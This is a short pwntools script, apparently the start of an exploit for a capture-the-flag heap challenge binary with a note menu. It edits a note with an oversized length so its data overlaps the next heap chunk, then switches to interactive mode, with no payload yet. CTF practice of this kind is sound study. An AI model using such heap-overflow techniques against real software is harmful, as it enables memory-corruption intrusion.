from pwn import *

r = process('./chal')

context.arch = 'amd64'

def add_note(idx, note_name):
    r.sendafter(b'> ', b'1')
    r.sendlineafter(b'index\n> ', str(idx))
    r.sendafter(b'note name\n> ', note_name)

def edit_note(idx, note_size, message):
    r.sendafter(b"> ", b"2")
    r.sendlineafter(b'index\n> ', str(idx))
    r.sendlineafter(b'size\n> ', str(note_size))
    r.send(message)

def delete_note(idx):
    r.sendafter(b"> ", b"3")
    r.sendlineafter(b'index\n> ', str(idx))

def show_note():
    r.sendafter(b"> ", b"4")


add_note(0, b'a'*8)
edit_note(0, 0xa, b'a')
add_note(1, b'b'*8)
edit_note(0, 0x30, b'a'*48) #<-- overlap


r.interactive()